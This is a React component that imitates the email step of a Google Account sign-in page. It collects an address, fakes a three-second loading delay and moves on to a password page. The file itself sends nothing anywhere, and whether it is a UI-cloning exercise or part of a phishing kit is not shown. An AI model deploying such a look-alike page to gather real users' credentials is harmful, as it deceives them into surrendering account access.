import React, { useContext, useState } from "react";
import { AppContext } from "../App";
import {
  TextField,
  makeStyles,
  Link,
  Box,
  Typography,
  useTheme,
  Button,
} from "@material-ui/core";
import useMediaQuery from "@material-ui/core/useMediaQuery";
import { navigate } from "@reach/router";

const useStyles = makeStyles((theme) => ({
  margintop: {
    padding: theme.spacing(5),
    display: "flex",
    flexDirection: "column",
    alignItems: "flex-start",
  },
  margintopsm: {
    marginTop: theme.spacing(3),
    padding: theme.spacing(1),
    display: "flex",
    flexDirection: "column",
    alignItems: "flex-start",
  },
  boldtext: {
    fontWeight: "bold",
    marginTop: theme.spacing(1),
  },
  mt: {
    marginTop: theme.spacing(6),
    display: "flex",
    flexDirection: "column",
    alignItems: "flex-start",
  },
  mtt: {
    marginTop: theme.spacing(1),
  },
  mt3: {
    marginTop: theme.spacing(6),
    width: "-webkit-fill-available",
  },
  link: {
    fontWeight: "bold",
  },
  space: {
    flexGrow: 1,
  },
}));

function EmailPage(props) {
  const classes = useStyles();
  const { loading, data, setData, setLoading } = useContext(AppContext);
  const [email, setEmail] = useState(props.email);

  const submit = (e) => {
    e.preventDefault();
    window.scrollTo(0, 0);
    setLoading({ ...loading, loading: true });
    setTimeout(() => {
      setLoading({
        ...loading,
        loading: !loading,
      });
      setData({
        ...data,
        email: email,
      });
      navigate("password");
    }, 3000);
  };

  const preventDefault = (event) => event.preventDefault();
  return (
    <React.Fragment>
      <Box display="flex" flexDirection="column" alignItems="center">
        <Typography variant="h5" className={classes.mtt}>
          Sign in
        </Typography>
        <Typography variant="body1" className={classes.mtt}>
          Use your Google Account
        </Typography>
      </Box>

      <div
        className={
          useMediaQuery(useTheme().breakpoints.up("sm"))
            ? classes.margintop
            : classes.margintopsm
        }
      >
        <form onSubmit={submit}>
          <TextField
            id="outlined-search"
            label="Email or phone"
            type="email"
            value={email}
            variant="outlined"
            onChange={(e) => setEmail(e.target.value)}
            fullWidth
            required
          />
          <Link href="#" onClick={preventDefault}>
            <Typography variant="body2" className={classes.boldtext}>
              Forgot email?
            </Typography>
          </Link>
          <div className={classes.mt}>
            <Typography variant="body2" align="left">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <span className={classes.link}>
                <Link>Learn more</Link>
              </span>
            </Typography>
          </div>
          <Box display="flex" justifyContent="center" className={classes.mt3}>
            <Typography
              variant="body2"
              align="left"
              className={classes.boldtext}
            >
              <Link>Create account</Link>
            </Typography>
            <span className={classes.space} />
            <Button variant="contained" type="submit" color="primary">
              Next
            </Button>
          </Box>
        </form>
      </div>
    </React.Fragment>
  );
}

export default EmailPage;
